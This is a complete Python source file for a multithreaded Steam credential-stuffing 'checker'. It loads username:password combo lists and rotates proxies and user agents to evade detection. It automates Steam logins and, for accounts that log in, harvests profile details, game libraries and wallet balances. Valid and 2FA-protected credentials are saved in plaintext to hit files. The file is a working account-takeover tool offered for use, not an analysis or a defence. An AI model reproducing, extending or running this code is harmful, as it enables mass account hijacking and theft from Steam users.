import os
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64
import time
import random
import concurrent.futures
from loguru import logger
import colorama
from colorama import Fore, Back, Style
from datetime import datetime
import queue
import threading
import tkinter as tk
from tkinter import filedialog

import modules.rpc_manager as rpc_manager
from modules.settings import APP_AUTHOR
rpc_manager.set_details("Steam Checker")

class SteamChecker:
    def __init__(self, parent=None):
        self.parent = parent
        self.version = "1.0.0"
        self.author = APP_AUTHOR
        self.proxies_list = []
        self.max_threads = 10
        self.delay_between_requests = 0.5
        self.lock = threading.Lock()
        self.stats = {
            'checked': 0,
            'valid': 0,
            'invalid': 0,
            '2fa': 0
        }
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def set_title(self, title):
        if os.name == 'nt':
            os.system(f'title {title}')
            
    def print_banner(self):
        banner = f"""
    {Fore.RED}╔══════════════════════════════════════════════════════════════════════════════════╗
    {Fore.RED}║  {Fore.BLUE}                                                                                {Fore.RED}║
    {Fore.RED}║  {Fore.CYAN}   ███████╗████████╗███████╗ █████╗ ███╗   ███╗                                 {Fore.RED}║
    {Fore.RED}║  {Fore.CYAN}   ██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║                                 {Fore.RED}║
    {Fore.RED}║  {Fore.CYAN}   ███████╗   ██║   █████╗  ███████║██╔████╔██║                                 {Fore.RED}║
    {Fore.RED}║  {Fore.CYAN}   ╚════██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║                                 {Fore.RED}║
    {Fore.RED}║  {Fore.CYAN}   ███████║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║                                 {Fore.RED}║
    {Fore.RED}║  {Fore.CYAN}   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                                 {Fore.RED}║
    {Fore.RED}║  {Fore.MAGENTA}   ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗                       {Fore.RED}║
    {Fore.RED}║  {Fore.MAGENTA}  ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗                      {Fore.RED}║
    {Fore.RED}║  {Fore.MAGENTA}  ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝                      {Fore.RED}║
    {Fore.RED}║  {Fore.MAGENTA}  ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗                      {Fore.RED}║
    {Fore.RED}║  {Fore.MAGENTA}  ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║                      {Fore.RED}║
    {Fore.RED}║  {Fore.MAGENTA}   ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                      {Fore.RED}║
    {Fore.RED}║                                                                                  ║
    {Fore.RED}║  {Fore.GREEN}╔═══════════════════════════════════════════════════════════╗  {Fore.RED}                 ║
    {Fore.RED}║  {Fore.GREEN}║{Fore.YELLOW}    Steam Checker v{self.version} {Fore.RESET}- {Fore.YELLOW} Developer: {Fore.RED+self.author}           {Fore.GREEN}║               {Fore.RED}    ║
    {Fore.RED}║  {Fore.GREEN}╚═══════════════════════════════════════════════════════════╝  {Fore.RED}                 ║
    {Fore.RED}║                                                                                  ║
    {Fore.RED}╚══════════════════════════════════════════════════════════════════════════════════╝
    """

        print(banner)
    
    def print_menu(self):
        menu = f"""
    {Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗
    {Fore.CYAN}║ {'STEAM CHECKER':^80} ║
    {Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════════╣
    {Fore.CYAN}║                                                                                  ║
    {Fore.CYAN}║  {Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] {'Start Checking':<15} {Fore.WHITE}[{Fore.GREEN}2{Fore.WHITE}] {'Settings':<15} {Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}] {'Capture':<15} {Fore.WHITE}[{Fore.GREEN}4{Fore.WHITE}] {'Statistics':<15} {Fore.CYAN}║
    {Fore.CYAN}║  {Fore.WHITE}[{Fore.RED}0{Fore.WHITE}] {'Back':<69} {Fore.CYAN}║
    {Fore.CYAN}║                                                                                  ║
    {Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════════╝
    """
        print(menu)
    
    def load_proxies(self):
        print(Fore.BLUE + "Loading proxies..." + Style.RESET_ALL)
        try:
            root = tk.Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            
            print(Fore.YELLOW + "Select proxy file (proxy.txt or proxies.txt):" + Style.RESET_ALL)
            proxy_file = filedialog.askopenfilename(
                title="Select Proxy File",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
                initialfile="proxies.txt"
            )
            
            root.destroy()
            
            if not proxy_file:
                print(Fore.YELLOW + "No file selected. Checking for default proxy files..." + Style.RESET_ALL)
                proxy_files = ["proxy.txt", "proxies.txt"]
                for proxy_file in proxy_files:
                    if os.path.exists(proxy_file):
                        with open(proxy_file, "r", encoding="utf-8") as file:
                            proxies_list = file.readlines()
                        proxies = [proxy.strip() for proxy in proxies_list if proxy.strip()]
                        print(Fore.BLUE + f"Loaded {len(proxies)} proxies from {proxy_file}" + Style.RESET_ALL)
                        return proxies
                print(Fore.YELLOW + "No proxy files found, running without proxies" + Style.RESET_ALL)
                return []
            
            if os.path.exists(proxy_file):
                with open(proxy_file, "r", encoding="utf-8") as file:
                    proxies_list = file.readlines()
                proxies = [proxy.strip() for proxy in proxies_list if proxy.strip()]
                print(Fore.BLUE + f"Loaded {len(proxies)} proxies from {proxy_file}" + Style.RESET_ALL)
                return proxies
            else:
                print(Fore.RED + f"File not found: {proxy_file}" + Style.RESET_ALL)
                print(Fore.YELLOW + "Running without proxies" + Style.RESET_ALL)
                return []
                
        except Exception as e:
            print(Fore.RED + f"Error loading proxies: {e}" + Style.RESET_ALL)
            return []

    def process_combo(self, combo):
        try:
            user, passw = combo.strip().split(":")
        except ValueError:
            logger.error(f"Invalid combo format: {combo.strip()}")
            return
            
        user_agent = random.choice(self.user_agents)
        
        while True:
            s = requests.Session()
            
            if self.proxies_list:
                proxy = random.choice(self.proxies_list)
                proxies = {
                    'http': "http://" + proxy,
                    'https': "http://" + proxy,
                }
            else:
                proxies = None

            url = 'https://steamcommunity.com/login/getrsakey/'
            values = {'username': user, 'donotcache': str(int(time.time() * 1000))}
            headers = {'User-Agent': user_agent}
            
            try:
                response = s.post(url, data=values, headers=headers, proxies=proxies, timeout=30)
                
                if response.status_code != 200:
                    logger.warning(f"Failed to get RSA key for {user} - Status: {response.status_code}")
                    time.sleep(self.delay_between_requests)
                    continue
                    
                data = response.json()
                if not data.get("success"):
                    logger.warning(f"Failed to get RSA key for {user}")
                    return

                mod = int(data["publickey_mod"], 16)
                exp = int(data["publickey_exp"], 16)
                rsa = RSA.construct((mod, exp))
                cipher = PKCS1_v1_5.new(rsa)
                encrypted_password = base64.b64encode(cipher.encrypt(passw.encode())).decode()

                url2 = 'https://steamcommunity.com/login/dologin/'
                values2 = {
                    'username': user,
                    "password": encrypted_password,
                    "emailauth": "",
                    "loginfriendlyname": "",
                    "captchagid": "-1",
                    "captcha_text": "",
                    "emailsteamid": "",
                    "rsatimestamp": data["timestamp"],
                    "remember_login": False,
                    "donotcache": str(int(time.time() * 1000)),
                }
                headers2 = {'User-Agent': user_agent}
                
                response2 = s.post(url2, data=values2, headers=headers2, proxies=proxies, timeout=30)
                data2 = response2.json()
                
                with self.lock:
                    self.stats['checked'] += 1
                    
                if data2["success"] == True:
                    with self.lock:
                        self.stats['valid'] += 1
                    logger.success(f"Logged in successfully for [{user}] ")
                    
                    if not os.path.exists("results"):
                        os.makedirs("results")
                    if not os.path.exists("results/steam"):
                        os.makedirs("results/steam")
                    
                    with open("results/hit.txt", "a", encoding="utf-8") as hit_file:
                        hit_file.write(f"{user}:{passw}\n")
                    
                    steamid = data2.get('steamid', '')
                    capture_data = self.capture_account_info(s, user, passw, steamid, user_agent, proxies, success=True)
                    
                    self.save_captured_account(capture_data)
                    
                    break
                else:
                    if data2.get('emailauth_needed', False):
                        with self.lock:
                            self.stats['2fa'] += 1
                        logger.warning(f"2FA BAD ACCOUNT [{user}]")
                        
                        if not os.path.exists("results"):
                            os.makedirs("results")
                        if not os.path.exists("results/steam"):
                            os.makedirs("results/steam")
                            
                        with open("results/2fa.txt", "a", encoding="utf-8") as fa_file:
                            fa_file.write(f"{user}:{passw}\n")
                        
                        steamid = data2.get('steamid', '')
                        capture_data = self.capture_account_info(s, user, passw, steamid, user_agent, proxies, success=False)
                        
                        self.save_2fa_account(capture_data)
                    else:
                        with self.lock:
                            self.stats['invalid'] += 1
                        logger.error(f"BAD ACCOUNT [{user}]")
                    
                    self.capture_account_info(s, user, passw, data2.get('steamid', ''), user_agent, proxies, success=False)
                    
                    break
            except requests.exceptions.RequestException as e:
                logger.error(f"Network error for {user}: {e}")
                time.sleep(self.delay_between_requests)
                continue
            except Exception as e:
                logger.error(f"ERROR for {user}: {e}")
                continue

    def validate_session(self, session, username, user_agent, proxies):
        try:
            auth_check_url = 'https://steamcommunity.com/my'
            response = session.get(auth_check_url, headers={'User-Agent': user_agent}, proxies=proxies, timeout=30)
            
            if response.status_code == 200:
                if 'logout' in response.text.lower() and username.lower() in response.text.lower():
                    logger.info(f"Session validated for {username}")
                    return True
                else:
                    logger.warning(f"Session not authenticated for {username}")
                    return False
            else:
                logger.warning(f"Auth check failed with status {response.status_code} for {username}")
                return False
                
        except Exception as e:
            logger.error(f"Session validation error for {username}: {e}")
            return False

    def capture_account_info(self, session, username, password, steamid, user_agent, proxies, success=True):
        try:
            account_info = {
                'username': username,
                'password': password,
                'steamid': steamid,
                'profile_url': f'https://steamcommunity.com/profiles/{steamid}' if steamid else 'N/A',
                'capture_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'login_status': 'SUCCESS' if success else 'FAILED'
            }
            
            if success:
                if not self.validate_session(session, username, user_agent, proxies):
                    logger.warning(f"Session validation failed for {username}, capture may be incomplete")
                    account_info['login_status'] = 'SESSION_EXPIRED'
                    success = False
            
            if success and steamid:
                try:
                    profile_url = f'https://steamcommunity.com/profiles/{steamid}'
                    profile_response = session.get(profile_url, headers={'User-Agent': user_agent}, proxies=proxies, timeout=30)
                    
                    logger.info(f"Profile response status: {profile_response.status_code} for {username}")
                    
                    if profile_response.status_code == 200:
                        profile_html = profile_response.text
                        logger.info(f"Profile HTML length: {len(profile_html)} for {username}")
                        
                        import re
                        name_patterns = [
                            r'<span class="actual_persona_name">([^<]+)</span>',
                            r'<div class="persona_name"[^>]*>([^<]+)</div>',
                            r'<title>([^<]+) - Steam Community</title>'
                        ]
                        
                        for pattern in name_patterns:
                            name_match = re.search(pattern, profile_html, re.IGNORECASE)
                            if name_match:
                                account_info['profile_name'] = name_match.group(1).strip()
                                logger.info(f"Found profile name: {account_info['profile_name']} for {username}")
                                break
                        
                        country_patterns = [
                            r'<img class="profile_flag" src="[^"]+" alt="([^"]+)"',
                            r'country:\s*([^,\n]+)',
                            r'<div class="profile_header_location">([^<]+)</div>'
                        ]
                        
                        for pattern in country_patterns:
                            country_match = re.search(pattern, profile_html, re.IGNORECASE)
                            if country_match:
                                account_info['country'] = country_match.group(1).strip()
                                break
                        
                        level_patterns = [
                            r'<span class="friendPlayerLevelNum">(\d+)</span>',
                            r'<div class="profile_badges_badge"[^>]*data-tooltip-text="Level (\d+)"',
                            r'level:\s*(\d+)'
                        ]
                        
                        for pattern in level_patterns:
                            level_match = re.search(pattern, profile_html, re.IGNORECASE)
                            if level_match:
                                account_info['account_level'] = level_match.group(1)
                                break
                        
                        if 'profile_private' in profile_html or 'Private Profile' in profile_html:
                            account_info['profile_status'] = 'Private'
                        elif 'profile_public' in profile_html or 'Public Profile' in profile_html:
                            account_info['profile_status'] = 'Public'
                        else:
                            account_info['profile_status'] = 'Unknown'
                        
                        vac_patterns = [
                            r'<div class="profile_ban_status">([^<]+)</div>',
                            r'vacBanned[^>]*>([^<]+)<',
                            r'VAC ban(s)?' 
                        ]
                        
                        account_info['vac_status'] = 'Clean'
                        for pattern in vac_patterns:
                            if re.search(pattern, profile_html, re.IGNORECASE):
                                account_info['vac_status'] = 'Banned'
                                break
                        
                        if 'limited' in profile_html.lower() or 'Limited User' in profile_html:
                            account_info['limited_account'] = 'Yes'
                        else:
                            account_info['limited_account'] = 'No'
                            
                        logger.info(f"Profile info extracted for {username}: name={account_info.get('profile_name', 'N/A')}, country={account_info.get('country', 'N/A')}, level={account_info.get('account_level', 'N/A')}")
                    else:
                        logger.warning(f"Failed to fetch profile page: Status {profile_response.status_code} for {username}")
                        account_info['profile_status'] = f'Error: HTTP {profile_response.status_code}'
                        
                except Exception as e:
                    logger.error(f"Failed to fetch profile info for {username}: {e}")
                    account_info['profile_status'] = 'Error: Exception'
            else:
                account_info['profile_status'] = 'Unknown (Login Failed)'
                account_info['vac_status'] = 'Unknown'
                account_info['limited_account'] = 'Unknown'
            
            if success and steamid:
                try:
                    games_url = f'https://steamcommunity.com/profiles/{steamid}/games/?tab=all&xml=1'
                    games_response = session.get(games_url, headers={'User-Agent': user_agent}, proxies=proxies, timeout=30)
                    
                    logger.info(f"Games API response status: {games_response.status_code} for {username}")
                    
                    if games_response.status_code == 200:
                        import xml.etree.ElementTree as ET
                        try:
                            root = ET.fromstring(games_response.text)
                            games = []
                            total_games = 0
                            
                            games_list = root.findall('.//game')
                            if not games_list:
                                games_list = root.findall('games/game')
                            
                            for game in games_list:
                                game_name = game.find('name')
                                game_hours = game.find('hoursOnRecord')
                                if game_name is not None:
                                    game_info = {
                                        'name': game_name.text if game_name.text else 'Unknown',
                                        'hours': game_hours.text if game_hours is not None and game_hours.text else '0'
                                    }
                                    games.append(game_info)
                                    total_games += 1
                            
                            account_info['total_games'] = total_games
                            account_info['games_list'] = games[:20]
                            logger.info(f"Successfully parsed {total_games} games for {username}")
                            
                        except ET.ParseError as e:
                            logger.warning(f"XML parsing failed for {username}: {e}")
                            account_info['games_xml'] = games_response.text[:1000]
                            account_info['total_games'] = 'Parse Error'
                    else:
                        logger.warning(f"Failed to fetch games: Status {games_response.status_code} for {username}")
                        account_info['total_games'] = f'Error: HTTP {games_response.status_code}'
                        
                        try:
                            alt_games_url = f'https://steamcommunity.com/profiles/{steamid}/games'
                            alt_response = session.get(alt_games_url, headers={'User-Agent': user_agent}, proxies=proxies, timeout=30)
                            if alt_response.status_code == 200:
                                game_count_match = re.search(r'(\d+\s*games?)', alt_response.text, re.IGNORECASE)
                                if game_count_match:
                                    account_info['total_games'] = game_count_match.group(1)
                                    logger.info(f"Alternative games count found for {username}: {account_info['total_games']}")
                        except Exception as alt_e:
                            logger.error(f"Alternative games fetch failed for {username}: {alt_e}")
                            
                except Exception as e:
                    logger.error(f"Failed to fetch games for {username}: {e}")
                    account_info['total_games'] = 'Error: Exception'
            else:
                account_info['total_games'] = 'Unknown (Login Failed)'
            
            if success:
                try:
                    wallet_url = 'https://store.steampowered.com/account/history/'
                    wallet_response = session.get(wallet_url, headers={'User-Agent': user_agent}, proxies=proxies, timeout=30)
                    
                    logger.info(f"Wallet response status: {wallet_response.status_code} for {username}")
                    
                    if wallet_response.status_code == 200:
                        wallet_html = wallet_response.text
                        
                        balance_patterns = [
                            r'Wallet balance[^:]*:\s*<span[^>]*>([^<]+)</span>',
                            r'wallet_balance[^>]*>([^<]+)<',
                            r'balance[^:]*:\s*<span[^>]*class="price"[^>]*>([^<]+)</span>',
                            r'\$\s*\d+\.\d{2}'
                        ]
                        
                        for pattern in balance_patterns:
                            balance_match = re.search(pattern, wallet_html, re.IGNORECASE)
                            if balance_match:
                                account_info['wallet_balance'] = balance_match.group(1).strip()
                                logger.info(f"Found wallet balance for {username}: {account_info['wallet_balance']}")
                                break
                        else:
                            account_info['wallet_balance'] = 'Not Found'
                            logger.warning(f"No wallet balance found for {username}")
                    else:
                        logger.warning(f"Failed to fetch wallet info: Status {wallet_response.status_code} for {username}")
                    
                    if wallet_response.status_code != 200 or account_info.get('wallet_balance') == 'Not Found':
                        try:
                            alt_wallet_url = 'https://store.steampowered.com/account/'
                            alt_wallet_response = session.get(alt_wallet_url, headers={'User-Agent': user_agent}, proxies=proxies, timeout=30)
                            if alt_wallet_response.status_code == 200:
                                alt_wallet_html = alt_wallet_response.text
                                for pattern in balance_patterns:
                                    balance_match = re.search(pattern, alt_wallet_html, re.IGNORECASE)
                                    if balance_match:
                                        account_info['wallet_balance'] = balance_match.group(1).strip()
                                        logger.info(f"Found alt wallet balance for {username}: {account_info['wallet_balance']}")
                                        break
                        except Exception as alt_e:
                            logger.error(f"Alternative wallet fetch failed for {username}: {alt_e}")
                        
                except Exception as e:
                    logger.error(f"Failed to fetch wallet info for {username}: {e}")
                    account_info['wallet_balance'] = 'Error: Exception'
            else:
                account_info['wallet_balance'] = 'Unknown (Login Failed)'
            
            if not os.path.exists("results"):
                os.makedirs("results")
                
            capture_file = f"results/{username}_capture.txt"
            with open(capture_file, "w", encoding="utf-8") as f:
                f.write("=" * 80 + "\n")
                f.write(f"STEAM ACCOUNT CAPTURE - {account_info['capture_time']}\n")
                f.write("=" * 80 + "\n\n")
                
                f.write(f"Username: {account_info['username']}\n")
                f.write(f"Password: {account_info['password']}\n")
                f.write(f"SteamID: {account_info['steamid']}\n")
                f.write(f"Profile URL: {account_info['profile_url']}\n")
                f.write(f"Capture Time: {account_info['capture_time']}\n")
                f.write(f"Login Status: {account_info['login_status']}\n\n")
                
                if success and 'profile_name' in account_info:
                    f.write("PROFILE INFORMATION\n")
                    f.write("-" * 20 + "\n")
                    f.write(f"Profile Name: {account_info['profile_name']}\n")
                    f.write(f"Profile Status: {account_info['profile_status']}\n")
                    f.write(f"Account Level: {account_info.get('account_level', 'Unknown')}\n")
                    f.write(f"Country: {account_info.get('country', 'Unknown')}\n")
                    f.write(f"VAC Status: {account_info['vac_status']}\n")
                    f.write(f"Limited Account: {account_info['limited_account']}\n")
                    f.write(f"Wallet Balance: {account_info.get('wallet_balance', 'Unknown')}\n\n")
                else:
                    f.write("LOGIN STATUS: FAILED\n")
                    f.write("-" * 20 + "\n")
                    f.write("Unable to access profile information due to failed login.\n\n")
                
                if success and 'total_games' in account_info:
                    f.write("GAMES INFORMATION\n")
                    f.write("-" * 20 + "\n")
                    f.write(f"Total Games: {account_info['total_games']}\n\n")
                    
                    if 'games_list' in account_info:
                        f.write("Recent Games (Top 20):\n")
                        for i, game in enumerate(account_info['games_list'], 1):
                            f.write(f"{i}. {game['name']} - {game['hours']} hours\n")
                    
                    if 'games_xml' in account_info:
                        f.write("\nFull Games XML Data:\n")
                        f.write("-" * 20 + "\n")
                        f.write(account_info['games_xml'])
                elif not success:
                    f.write("GAMES INFORMATION\n")
                    f.write("-" * 20 + "\n")
                    f.write("Unable to access games information due to failed login.\n")
            
            logger.success(f"Account capture saved to {capture_file}")
            
            self.display_capture_summary(account_info)
            
            return account_info
            
        except Exception as e:
            logger.error(f"Failed to capture account info: {e}")
            return account_info
    
    def save_2fa_account(self, account_info):
        try:
            if not os.path.exists("results/steam"):
                os.makedirs("results/steam")
            
            twofa_data = f"""{account_info['username']}:{account_info['password']}|{account_info.get('profile_name', 'N/A')}|{account_info.get('account_level', 'N/A')}|{account_info.get('country', 'N/A')}|{account_info.get('wallet_balance', 'N/A')}|{account_info.get('total_games', 'N/A')}|{account_info.get('vac_status', 'N/A')}|{account_info.get('profile_status', 'N/A')}|{account_info['steamid']}|{account_info['capture_time']}|2FA"""
            
            with open("results/steam/2fa.txt", "a", encoding="utf-8") as steam_2fa_file:
                steam_2fa_file.write(twofa_data + "\n")
            
            logger.success(f"2FA account saved to results/steam/2fa.txt")
            
        except Exception as e:
            logger.error(f"Failed to save 2FA account: {e}")

    def save_captured_account(self, account_info):
        try:
            if not os.path.exists("results/steam"):
                os.makedirs("results/steam")
            
            hit_data = f"""{account_info['username']}:{account_info['password']}|{account_info.get('profile_name', 'N/A')}|{account_info.get('account_level', 'N/A')}|{account_info.get('country', 'N/A')}|{account_info.get('wallet_balance', 'N/A')}|{account_info.get('total_games', 'N/A')}|{account_info.get('vac_status', 'N/A')}|{account_info.get('profile_status', 'N/A')}|{account_info['steamid']}|{account_info['capture_time']}"""
            
            with open("results/steam/hit.txt", "a", encoding="utf-8") as steam_hit_file:
                steam_hit_file.write(hit_data + "\n")
            
            logger.success(f"Captured account saved to results/steam/hit.txt")
            
            with open("results/steam/hit_formatted.txt", "a", encoding="utf-8") as formatted_file:
                formatted_file.write("=" * 100 + "\n")
                formatted_file.write(f"ACCOUNT: {account_info['username']} ({account_info.get('profile_name', 'N/A')})\n")
                formatted_file.write(f"SteamID: {account_info['steamid']}\n")
                formatted_file.write(f"Level: {account_info.get('account_level', 'N/A')} | Country: {account_info.get('country', 'N/A')}\n")
                formatted_file.write(f"Wallet: {account_info.get('wallet_balance', 'N/A')} | Games: {account_info.get('total_games', 'N/A')}\n")
                formatted_file.write(f"VAC: {account_info.get('vac_status', 'N/A')} | Profile: {account_info.get('profile_status', 'N/A')}\n")
                formatted_file.write(f"Captured: {account_info['capture_time']}\n")
                formatted_file.write("=" * 100 + "\n\n")
            
        except Exception as e:
            logger.error(f"Failed to save captured account: {e}")

    def display_capture_summary(self, account_info):
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.GREEN}ACCOUNT CAPTURE SUMMARY{Fore.RESET}")
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}Username: {Fore.WHITE}{account_info['username']}")
        print(f"{Fore.CYAN}SteamID: {Fore.WHITE}{account_info['steamid']}")
        print(f"{Fore.CYAN}Login Status: {Fore.GREEN if account_info['login_status'] == 'SUCCESS' else Fore.RED}{account_info['login_status']}{Style.RESET_ALL}")
        
        if account_info['login_status'] == 'SUCCESS' and 'profile_name' in account_info:
            print(f"{Fore.CYAN}Profile Name: {Fore.WHITE}{account_info['profile_name']}")
            print(f"{Fore.CYAN}Profile Status: {Fore.WHITE}{account_info['profile_status']}")
            print(f"{Fore.CYAN}Account Level: {Fore.WHITE}{account_info.get('account_level', 'Unknown')}")
            print(f"{Fore.CYAN}Country: {Fore.WHITE}{account_info.get('country', 'Unknown')}")
            print(f"{Fore.CYAN}VAC Status: {Fore.WHITE}{account_info['vac_status']}")
            print(f"{Fore.CYAN}Limited Account: {Fore.WHITE}{account_info['limited_account']}")
            print(f"{Fore.CYAN}Wallet Balance: {Fore.WHITE}{account_info.get('wallet_balance', 'Unknown')}")
        else:
            print(f"{Fore.YELLOW}Detailed information unavailable - Login failed{Style.RESET_ALL}")
        
        if account_info['login_status'] == 'SUCCESS' and 'total_games' in account_info:
            print(f"{Fore.CYAN}Total Games: {Fore.WHITE}{account_info['total_games']}")
        
        print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}\n")
    
    def capture_single_account(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"{Fore.YELLOW}Enter account details (username:password): {Fore.RESET}", end="")
        combo = input().strip()
        
        if not combo or ':' not in combo:
            print(f"{Fore.RED}Invalid format! Use username:password{Style.RESET_ALL}")
            input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}Capturing account information...{Style.RESET_ALL}")
        
        if not self.proxies_list:
            self.proxies_list = self.load_proxies()
        
        self.process_combo(combo)
        
        input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def print_stats(self):
        self.clear_screen()
        self.print_banner()
        
        stats_text = f"""
{Fore.CYAN}{'Statistics'}
{Fore.MAGENTA}{'='*30}

{Fore.GREEN}{'Checked Accounts'}: {self.stats['checked']}
{Fore.GREEN}{'Valid Accounts'}: {self.stats['valid']}
{Fore.RED}{'Invalid Accounts'}: {self.stats['invalid']}
{Fore.YELLOW}{'2FA Accounts'}: {self.stats['2fa']}

{Fore.MAGENTA}{'='*30}
"""
        print(stats_text)
        input(f"{Fore.YELLOW}{'Press Enter to continue...'}")
        
    def settings_menu(self):
        while True:
            self.clear_screen()
            self.print_banner()
            
            settings_menu_text = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {'SETTINGS':^80} ║
{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════════╣
{Fore.CYAN}║                                                                                  ║
{Fore.CYAN}║  {Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] Threads          {Fore.WHITE}[{Fore.GREEN}2{Fore.WHITE}] Delay            {Fore.CYAN}║
{Fore.CYAN}║                                                                                  ║
{Fore.CYAN}║  {Fore.WHITE}[{Fore.RED}0{Fore.WHITE}] Back                                                              {Fore.CYAN}║
{Fore.CYAN}║                                                                                  ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════════╝
"""
            print(settings_menu_text)
            
            choice = input(f"{Fore.YELLOW}║  {Fore.WHITE}{'Choose:'} {Fore.GREEN}").strip()
            
            if choice == '1':
                try:
                    new_threads = int(input(f"{Fore.YELLOW}Enter new thread count (current: {self.max_threads}): "))
                    if 1 <= new_threads <= 50:
                        self.max_threads = new_threads
                        print(f"{Fore.GREEN}Thread count updated to {new_threads}")
                    else:
                        print(f"{Fore.RED}Thread count must be between 1 and 50")
                except ValueError:
                    print(f"{Fore.RED}Invalid input")
                input(f"{Fore.YELLOW}{'Press Enter to continue...'}")
            elif choice == '2':
                try:
                    new_delay = float(input(f"{Fore.YELLOW}Enter new delay between requests (current: {self.delay_between_requests}s): "))
                    if 0 <= new_delay <= 10:
                        self.delay_between_requests = new_delay
                        print(f"{Fore.GREEN}Delay updated to {new_delay}s")
                    else:
                        print(f"{Fore.RED}Delay must be between 0 and 10 seconds")
                except ValueError:
                    print(f"{Fore.RED}Invalid input")
                input(f"{Fore.YELLOW}{'Press Enter to continue...'}")
            elif choice == '0':
                break
            else:
                print(f"{Fore.RED}{'Invalid choice!'}")
                time.sleep(2)
    
    def start_checking(self):
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        print(Fore.YELLOW + "Select combo file (combo.txt):" + Style.RESET_ALL)
        combo_file = filedialog.askopenfilename(
            title="Select Combo File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile="combo.txt"
        )
        
        root.destroy()
        
        if not combo_file:
            print(Fore.YELLOW + "No file selected. Using default: combo.txt" + Style.RESET_ALL)
            combo_file = "combo.txt"
        
        if not os.path.exists(combo_file):
            print(Fore.RED + f"Error: {combo_file} file not found!" + Style.RESET_ALL)
            print(Fore.YELLOW + "Please create combo.txt file with username:password combinations" + Style.RESET_ALL)
            
            with open(combo_file, 'w', encoding='utf-8') as f:
                f.write("Add your username:password combinations below (one per line):\n")
                f.write("Example:\n")
                f.write("username1:password1\n")
                f.write("username2:password2\n")
            print(Fore.GREEN + f"Created {combo_file}. Please add your combos and try again." + Style.RESET_ALL)
            input(f"{Fore.YELLOW}{'Press Enter to continue...'}")
            return
        
        with open(combo_file, "r", encoding="utf-8") as file:
            combos = file.readlines()

        print(Fore.CYAN + f"Loaded {len(combos)} combos to check..." + Style.RESET_ALL)
        print(Fore.CYAN + f"Starting with {self.max_threads} threads..." + Style.RESET_ALL)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            executor.map(self.process_combo, combos)
        
        print(Fore.GREEN + "Checking completed!" + Style.RESET_ALL)
        input(f"{Fore.YELLOW}{'Press Enter to continue...'}")
    
    def run(self):
        self.proxies_list = self.load_proxies()
        
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = input(f"{Fore.YELLOW}║  {Fore.WHITE}{'Choose:'} {Fore.GREEN}").strip()
            
            if choice == '1':
                self.start_checking()
            elif choice == '2':
                self.settings_menu()
            elif choice == '3':
                self.capture_single_account()
            elif choice == '4':
                self.print_stats()
            elif choice == '0':
                break
            else:
                print(f"{Fore.RED}{'Invalid choice!'}")
                time.sleep(2)

def main():
    checker = SteamChecker()
    checker.run()

if __name__ == "__main__":
    main()
